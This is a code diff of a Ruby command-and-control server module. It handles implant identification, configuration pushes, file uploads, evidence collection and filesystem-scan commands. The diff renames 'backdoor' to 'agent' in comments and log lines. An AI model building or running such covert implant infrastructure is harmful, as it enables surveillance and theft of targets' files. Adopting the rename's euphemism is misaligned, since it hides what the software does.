@@ -30,7 +30,7 @@ module Commands
   PROTO_UNINSTALL  = 0x0a       # Uninstall command
   PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
   PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
+  PROTO_UPGRADE    = 0x16       # Upgrade for the agent
   PROTO_EVIDENCE   = 0x09       # Upload of an evidence
   PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
 
@@ -48,7 +48,7 @@ module Commands
   # <- PROTO_OK, Time, Availables
   def command_id(peer, session, message)
 
-    # backdoor version
+    # agent version
     version = message.slice!(0..3).unpack('I').first
 
     # ident of the target
@@ -75,9 +75,9 @@ module Commands
     time = [now].pack('Q')
     
     available = ""
-    # ask to the db if there are any availables for the backdoor
+    # ask to the db if there are any availables for the agent
     # the results are actually downloaded and saved locally
-    # we will retrieve the content when the backdoor ask for them later
+    # we will retrieve the content when the agent ask for them later
     if DB.instance.new_conf? session[:bid] then
       available += [PROTO_CONF].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
@@ -140,10 +140,10 @@ module Commands
     if message.size > 0
       status = message.slice!(0..3).unpack('I').first
       if status == PROTO_OK
-        trace :info, "[#{peer}][#{session[:cookie]}] Configuration successfully received by the agent"
+        trace :info, "[#{peer}][#{session[:cookie]}] Configuration activated by the agent"
         DB.instance.activate_conf session[:bid]
       else
-        trace :warn, "[#{peer}][#{session[:cookie]}] There was an error on the agent while receiving the configuration"
+        trace :warn, "[#{peer}][#{session[:cookie]}] Agent not able to use the configuration"
       end
       return [PROTO_OK].pack('I')
     end
@@ -173,7 +173,7 @@ module Commands
     # the upload list was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
     # the database will output one upload at a time and the 'left' number of file
-    # we pass it to the backdoor which will request again if left is greater than zero
+    # we pass it to the agent which will request again if left is greater than zero
     upload, left = DB.instance.new_uploads session[:bid]
 
     # send the response
